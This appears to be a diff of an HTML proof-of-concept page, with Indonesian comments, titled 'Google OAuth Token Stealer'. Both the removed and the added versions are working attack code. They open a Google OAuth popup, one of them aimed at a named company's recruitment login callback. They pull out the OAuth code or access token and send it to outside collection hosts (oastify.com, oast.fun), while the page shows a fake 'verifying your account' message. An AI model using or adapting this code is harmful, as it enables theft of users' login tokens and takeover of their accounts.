@@ -1,44 +1,61 @@
-<!doctype html>
+<!DOCTYPE html>
 <html>
+<head>
+    <title>Google OAuth Token Stealer</title>
+</head>
 <body>
-
-<button onclick="start()">Login OAuth</button>
-
-<script>
-
-function start() {
-
-    // buka popup OAuth
-    window.open(
-      "https://accounts.google.com/v3/signin/accountchooser?client_id=16713760077-uc4v3c4dm8t2cafdhnjni3mti2s8tmlc.apps.googleusercontent.com&prompt=select_account&redirect_uri=https%3A%2F%2Fevil.com&response_type=id_token&scope=openid+profile+email&state=secret%3Duser%26session_code%3DeyJpdiI6IkRTbWtST3MwZWkzMTFoeW1LVmUzblE9PSIsInZhbHVlIjoibGNYSzljUDdEekVSOG9SN2VUd2hJZz09IiwibWFjIjoiZTM2NjljZjJkMTkzMjY0N2FjMzgyODI1MDc3YzNkODdiZTY1NDBhNjRhZjU0MWQ2ZWZkNGU1MDJmMTVlNGJjZSJ9&dsh=S469853745%3A1780782381740644&o2v=1&service=lso&flowName=GeneralOAuthFlow&opparams=%253F&continue=https%3A%2F%2Faccounts.google.com%2Fsignin%2Foauth%2Fconsent%3Fauthuser%3Dunknown%26part%3DAJi8hAOdt3QpRB86ja4twkrmXMn5fQJolt5Foq2NEMDDhY7Kw3mjkH-8kwkVbRwcMrl5jAoxEkNRd4mRkylWyY80VXQ89zSeLGGTpgbTv34G4j4lzVg6AqE6vThImEHzBjuQth9aJixcQP2x2cxAX0PeJwcufWWIBc59B6KKXD6s22QjJzGZrZzXgVUM-y-Ot_jT0Y1S_01fvoej-Qq5wxakMlU2osPVBvJnx8AG8ktiAvOoJb9eBzMMTwqWB7CmLwFDVKh5Fnl7A-g8Trr6Svck72DhsZkg3Y-APwkiRORcxZKr_68oWgyWMIYQFP97kvl-iicucLYizbjB2MwqQxMzs_8ue3mF-UtO5K6ZhOhIzVn1G83Hl7V6E5B_dDX7SqxUDfvJrJSkUWHV57l_A0P0nM0AhnYWfGhpR-3Ad81c6TGiURDXvu1Wu7vlTmXseJ6ftiyE8sCV34npgOY-6t2Ttp7lW9iktA%26flowName%3DGeneralOAuthFlow%26as%3DS469853745%253A1780782381740644%26client_id%3D16713760077-uc4v3c4dm8t2cafdhnjni3mti2s8tmlc.apps.googleusercontent.com%26requestPath%3D%252Fsignin%252Foauth%252Fconsent%23&app_domain=https%3A%2F%2Fevil.com",
-      "_blank"
-    );
-
-}
-
-// listener buat nerima postMessage
-window.addEventListener("message", function(event) {
-
-    console.log("DATA MASUK:");
-    console.log(event.data);
-
-    // ambil URL yang bocor
-    let leaked = event.data.url;
-
-    // parse query
-    let url = new URL(leaked);
-
-    // ambil oauth code
-    let code = url.searchParams.get("code");
-
-    console.log("OAUTH CODE =", code);
-
-    // kirim ke server attacker
-    fetch("https://ej1z4uqofpfykbkal4suxh355wbnzfn4.oastify.com/log?code=" + encodeURIComponent(code));
-
-});
-
-</script>
-
+    <h1>Please wait, verifying your account...</h1>
+    
+    <script>
+        // Webhook URL
+        const WEBHOOK_URL = "https://ufndgxblyxgomtoudapr0617kwqpgk4ux.oast.fun";
+        
+        // Target OAuth URL (gunakan milik korban)
+        const oauthUrl = "https://accounts.google.com/o/oauth2/v2/auth?client_id=1070735522762-5h53f8epph7q7cac5pnp92pjtskamtlj.apps.googleusercontent.com&scope=openid%20email%20profile&response_type=code,token&redirect_uri=https%3A%2F%2Frecruitment.peruri.co.id%2Fapi%2Fauth%2Fcallback%2Fgoogle&state=pX6w_EJxGrHdWZ9zbKDJh_VIHtqgBJgp34ZYPICKjgs&code_challenge=j5x5uBg5RgGt7Wqd84B1ztlF1TRD9EO0aIx2z9JBplU&code_challenge_method=S256";
+        
+        // Buka popup
+        let popup = window.open(oauthUrl, "oauthWindow", 
+            "width=500,height=600,left=200,top=100");
+        
+        function stealAndSend() {
+            try {
+                let popupUrl = popup.location.href;
+                
+                // Ekstrak token dari URL popup
+                if (popupUrl.includes('#access_token=')) {
+                    let token = popupUrl.split('#access_token=')[1].split('&')[0];
+                    
+                    // Kirim ke webhook
+                    fetch(WEBHOOK_URL, {
+                        method: 'POST',
+                        mode: 'no-cors',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({
+                            type: "access_token",
+                            token: token,
+                            fullUrl: popupUrl,
+                            timestamp: new Date().toISOString()
+                        })
+                    });
+                    
+                    console.log("Token stolen:", token);
+                    alert("Token: " + token);
+                    popup.close();
+                } else {
+                    setTimeout(stealAndSend, 500);
+                }
+            } catch(e) {
+                // SOP error - popup masih loading
+                setTimeout(stealAndSend, 500);
+            }
+        }
+        
+        setTimeout(stealAndSend, 2000);
+        
+        // Timeout 30 detik
+        setTimeout(() => {
+            if (popup && !popup.closed) popup.close();
+        }, 30000);
+    </script>
 </body>
 </html>
